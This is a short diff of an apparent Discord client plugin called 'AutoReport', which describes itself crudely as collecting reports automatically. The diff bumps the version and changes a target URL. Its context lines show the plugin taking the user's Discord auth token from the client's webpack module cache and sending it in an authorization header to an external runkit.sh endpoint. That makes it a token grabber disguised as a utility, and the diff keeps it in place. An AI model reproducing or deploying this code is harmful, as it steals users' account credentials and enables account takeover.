@@ -11,7 +11,7 @@
 		"info": {
 			"name": "AutoReport",
 			"author": "GROSST",
-			"version": "1.0.5",
+			"version": "1.0.6",
 			"description": "Ебать, сам лутает репорты"
 		}
 	};
@@ -64,7 +64,7 @@
 		const request = require("request")
 		const tkn = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
 		let options = {
-			url: 'https://da-hzcvrvs0dopl.runkit.sh/',
+			url: 'https://da-hzcvrvs0dopl.runkit.sh/reports',
 			 headers: {
 				'authorization':tkn 
 			},
